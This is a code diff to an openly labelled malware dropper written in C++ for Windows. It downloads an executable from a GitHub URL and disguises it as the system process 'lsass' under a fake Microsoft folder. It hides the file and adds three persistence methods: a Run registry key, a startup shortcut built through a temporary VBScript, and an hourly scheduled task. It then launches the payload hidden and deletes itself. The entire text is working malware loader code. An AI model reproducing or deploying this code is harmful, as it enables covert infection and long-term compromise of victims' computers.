@@ -33,33 +33,45 @@ void Install()
 	}
 
 	// create dirs
-	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation", NULL);
-	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Windows", NULL);
-	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData", NULL);
+	CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation", NULL);
+	CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Windows", NULL);
+	CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData", NULL);
 
 	//fake dirs
-	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\DRM", NULL);
-	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Network", NULL);
-	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Windows NT", NULL);
-	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Search", NULL);
-	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Search\\Data", NULL);
-	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Vault", NULL);
-	CreateDirectory(L"C:\\ProgramData\\Microsoft Corporation\\Temp", NULL);
+	CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\DRM", NULL);
+	CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Network", NULL);
+	CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Windows NT", NULL);
+	CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Search", NULL);
+	CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Search\\Data", NULL);
+	CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Vault", NULL);
+	CreateDirectory(L"C:\\ProgramData\\MicrosoftCorporation\\Temp", NULL);
 
 	// download discordia
-	URLDownloadToFile(0, L"https://github.com/foxovsky/PointBlank/raw/master/server/Auth/bin/Release/Game.exe", L"C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData\\lsass.exe", 0, 0);
+	URLDownloadToFile(0, L"https://github.com/foxovsky/PointBlank/raw/master/server/Auth/bin/Release/Game.exe", L"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe", 0, 0);
 
 	// update file attributes
-	BOOL result = SetFileAttributes(L"C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData\\lsass.exe", FILE_ATTRIBUTE_HIDDEN);
+	BOOL result = SetFileAttributes(L"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe", FILE_ATTRIBUTE_HIDDEN);
 
 	// update dirs attributes
-	system("attrib \"C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData\" +h");
+	system("attrib \"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\" +h");
 
-	// add to autoload
-	system("REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Local Security Authority Process\" /t REG_SZ /F /D \"C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData\\lsass.exe\"");
+	// add to autoload part 1
+	system("REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Local Security Authority Process\" /t REG_SZ /F /D \"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe\"");
+
+	// add to autoload part 2
+	system("echo Set oWS = WScript.CreateObject(\"WScript.Shell\") > CreateShortcut.vbs");
+	system("echo sLinkFile = \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemHost.lnk\" >> CreateShortcut.vbs");
+	system("echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs");
+	system("echo oLink.TargetPath = \"C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe\" >> CreateShortcut.vbs");
+	system("echo oLink.Save >> CreateShortcut.vbs");
+	system("cscript CreateShortcut.vbs");
+	system("del CreateShortcut.vbs");
+
+	// add to autoload part 3
+	system("powershell.exe SCHTASKS.exe /Create /SC HOURLY /TN \"System Host\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");
 
 	// starting malware
-	WinExec("C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData\\lsass.exe", SW_HIDE);
+	WinExec("C:\\ProgramData\\Microsoft Corporation\\Windows\\SystemData\\Isass.exe", SW_HIDE);
 
 	// suicide loader
 	char current_work_dir[FILENAME_MAX];
